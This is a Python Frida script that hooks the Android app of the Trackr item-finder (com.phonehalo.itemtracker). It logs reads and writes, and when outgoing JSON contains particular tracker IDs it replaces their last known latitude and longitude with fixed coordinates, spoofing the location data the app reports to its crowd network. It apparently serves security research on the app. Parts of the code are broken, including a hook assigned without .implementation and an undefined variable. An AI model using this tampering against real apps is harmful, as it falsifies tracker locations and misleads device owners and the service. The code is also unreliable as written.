import frida, sys

def on_message(message, data):
    if message['type'] == 'send':
        print("[*] {0}".format(message['payload']))
    else:
        print(message)

jscode = """
Java.perform(function () {
    // Function to hook is defined here
    var MainActivity = Java.use('java.io.BufferedReader');
    var url = Java.use("java.net.URL");

    var threadef = Java.use('java.lang.Thread');
    var threadinstance = threadef.$new();
    
    function Where(stack) {
        var at = '';
        for(var i = 0; i < stack.length; i++) {
            at = at + i.toString() + '\\t' + stack[i].toString() + '\\n';
        }
        return at;
    }
    
    // Whenever button is clicked
    MainActivity.read.overload('[C', 'int', 'int').implementation = function (v1, v2, v3) {
        // Show a message to know that the function got called
        console.log('\\n\\n\\n\\n---------------------');
        send('read is called: ');
        
        var stack = threadinstance.currentThread().getStackTrace()
        var full_call_stack = Where(stack)
        
        // retval = this.write(v1, v2, v3);
        // Log to the console that it's done, and we should have the flag!
        console.log('Recieved Trackr Info:' + v1.toString() + ', arg 2:' + v2 + ', arg 3:' + v3 + ", \\n\\ncall stack:\\n" + full_call_stack);
        
        console.log('---------------------\\n\\n\\n\\n');
    };

    var MainActivity2 = Java.use('java.io.BufferedWriter');
    
    // Whenever button is clicked
    MainActivity2.write.overload('java.lang.String', 'int', 'int').implementation = function (v1, v2, v3) {
        // Show a message to know that the function got called
        console.log('\\n\\n\\n\\n---------------------');
        send('write is called: ');
        
        // v1 = 'dsds';
        // v3 = 4;
        
        var retval = 0;
        
        var stack = threadinstance.currentThread().getStackTrace()
        var full_call_stack = Where(stack)
        
        if(v1.toString().includes("latitude") && v1.toString().includes("trackerId") && (v1.toString().includes("000006a1-a06705d6") || v1.toString().includes("0000e443-2d6e1bda"))) {
            // Call the original onClick handler
            console.log('Original stuff:' + v1)
            var allObjs = JSON.parse(v1);
            for (var i = 0; i < allObjs.length; i++) {
                var obj = allObjs[i]; 
                obj.lastKnownLocation.latitude = 30.7749;
                obj.lastKnownLocation.longitude = -101.8415702;
                
            }
            
            v1 = JSON.stringify(allObjs);
            v3 = v1.length;
            retval = this.write(v1, v2, v3);
            console.log('Sending third party trackr info:' + v1.toString());
        } else {
            retval = this.write(v1, v2, v3);
            // Log to the console that it's done, and we should have the flag!
            console.log('General Trackr Info:' + v1.toString() + ', arg 2:' + v2 + ', arg 3:' + v3);
        }
        console.log('Retval: ' + retval);
        
        // retval = this.write(v1, v2, v3);
        // Log to the console that it's done, and we should have the flag!
        console.log('General Trackr Info:' + v1.toString() + ', arg 2:' + v2 + ', arg 3:' + v3 + ", call stack:\\n" + full_call_stack);
        
        console.log('Retval: ' + retval);
        console.log('---------------------\\n\\n\\n\\n');
    };

    var MainActivity3 = Java.use('com.phonehalo.itemtracker.crowd.CrowdClient');

    MainActivity3.getResponse.overload('java.lang.String', 'java.net.HttpURLConnection', 'java.net.URL', 'boolean', 'boolean') = function(v1, v2, v3, v4, v5) {
        console.log('\\n\\n\\n\\n---------------------');
        console.log('\\n\\ngetResponse(String, HTTP, URL, bool, bool) was called: ');

        console.log('\\nv1: ' + v1);
        console.log('\\nv2: ' + v2);
        console.log('\\nv3: ' + v3);
        console.log('\\nv4: ' + v4);
        console.log('\\nv5: ' + v5);

        var stack = threadinstance.currentThread().getStackTrace()
        var full_call_stack = Where(stack)

        console.log('\\n\\nStack Trace:\\n' + full_stack_trace);
        console.log('---------------------\\n\\n\\n\\n');
    }

});
"""


process = frida.get_usb_device().attach('com.phonehalo.itemtracker')
script = process.create_script(jscode)
script.on('message', on_message)
print('[*] Running Trackr')
script.load()
sys.stdin.read()
